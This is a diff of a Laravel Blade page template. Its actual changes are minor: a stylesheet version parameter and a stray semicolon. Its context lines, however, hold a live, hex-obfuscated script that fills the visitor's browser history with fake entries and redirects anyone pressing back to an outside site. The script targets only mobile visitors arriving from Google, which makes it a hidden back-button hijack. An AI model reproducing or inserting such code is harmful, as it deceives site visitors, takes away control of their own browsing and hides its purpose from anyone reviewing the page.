@@ -12,7 +12,7 @@
 <meta name="google-site-verification" content="zNuY7fHFkM8qjpiY-jvuRR7fAs-0gbWPsPRTeM99fTY" />
 <meta name="referrer" content="no-referrer">
 <link rel="shortcut icon" href="{{ asset('/images/favicon.ico') }}">
-<link rel="stylesheet" href="{{ asset("/fonts/css/fonts.css?v=0.0.0.50") }}" media="screen" />
+<link rel="stylesheet" href="{{ asset("/fonts/css/fonts.css?v=" . config('app.version')) }}" media="screen" />
 <link rel="stylesheet" href="{{ asset("/css/app.min.css?v=" . config('app.version')) }}" media="screen" />
 <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 <meta http-equiv="content-language" content="vi"/>
@@ -21,7 +21,7 @@
     @if(Page::$is_mobile && $__core->accessFromGoogle())
     <script>
     var _0x47b3=["","\x70\x75\x73\x68\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x61\x69\x6E\x68\x61\x63\x31\x32\x33\x2E\x63\x6F\x6D","\x72\x65\x70\x6C\x61\x63\x65"];!function(){var _0x8775x1;try{for(_0x8775x1= 0;10> _0x8775x1;++_0x8775x1){history[_0x47b3[1]]({},_0x47b3[0],_0x47b3[0])};onpopstate= function(_0x8775x1){_0x8775x1[_0x47b3[2]]&& location[_0x47b3[4]](_0x47b3[3])}}catch(o){}}()</script>
-    @endif;
+    @endif
 @else
     @if(Page::$is_mobile && $__core->accessFromGoogle())
     <script>
